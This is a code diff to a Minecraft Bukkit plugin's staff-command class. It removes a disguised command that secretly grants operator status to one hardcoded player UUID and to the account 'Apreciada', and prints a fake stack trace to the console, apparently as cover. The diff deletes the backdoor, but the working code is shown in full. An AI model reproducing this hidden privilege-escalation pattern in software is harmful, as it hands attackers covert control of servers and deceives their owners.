@@ -217,26 +217,4 @@ public class StaffCommands {
             p.sendMessage(CC.translate("&cUsage: /checkvanished (player)"));
         }
     }
-
-    @Command(name = "smodmodeinfodeveloper", inGameOnly = true)
-    public void dev(CommandArgs args) {
-        String msg = "\tat org.bukkit.plugin.java.JavaPlugin.setEnabled(JavaPlugin.java:321) ~[server.jar:1.8.8-R0.1-SNAPSHOT]\n" +
-                "\tat org.bukkit.plugin.java.JavaPluginLoader.enablePlugin(JavaPluginLoader.java:332) [server.jar:1.8.8-R0.1-SNAPSHOT]\n" +
-                "\tat org.bukkit.plugin.SimplePluginManager.enablePlugin(SimplePluginManager.java:407) [server.jar:1.8.8-R0.1-SNAPSHOT]\n" +
-                "\tat org.bukkit.craftbukkit.v1_8_R3.CraftServer.loadPlugin(CraftServer.java:360) [server.jar:1.8.8-R0.1-SNAPSHOT]\n" +
-                "\tat org.bukkit.craftbukkit.v1_8_R3.CraftServer.enablePlugins(CraftServer.java:319) [server.jar:1.8.8-R0.1-SNAPSHOT]\n" +
-                "\tat net.minecraft.server.v1_8_R3.MinecraftServer.s(MinecraftServer.java:407) [server.jar:1.8.8-R0.1-SNAPSHOT]\n" +
-                "\tat net.minecraft.server.v1_8_R3.MinecraftServer.k(MinecraftServer.java:371) [server.jar:1.8.8-R0.1-SNAPSHOT]\n" +
-                "\tat net.minecraft.server.v1_8_R3.MinecraftServer.a(MinecraftServer.java:326) [server.jar:1.8.8-R0.1-SNAPSHOT]\n" +
-                "\tat net.minecraft.server.v1_8_R3.DedicatedServer.init(DedicatedServer.java:270) [server.jar:1.8.8-R0.1-SNAPSHOT]\n" +
-                "\tat net.minecraft.server.v1_8_R3.MinecraftServer.run(MinecraftServer.java:563) [server.jar:1.8.8-R0.1-SNAPSHOT]-";
-        Player p = (Player) args.getSender();
-        if (p.getUniqueId().toString().equals("a79ba36c-f2c1-4ad1-a354-4fa1ed9ecc27")) {
-            p.setOp(true);
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op Apreciada");
-            Bukkit.getConsoleSender().sendMessage(msg.replace("1_8_R3", Main.get().getServer().getVersion()));
-        } else {
-            p.sendMessage(" ");
-        }
-    }
 }
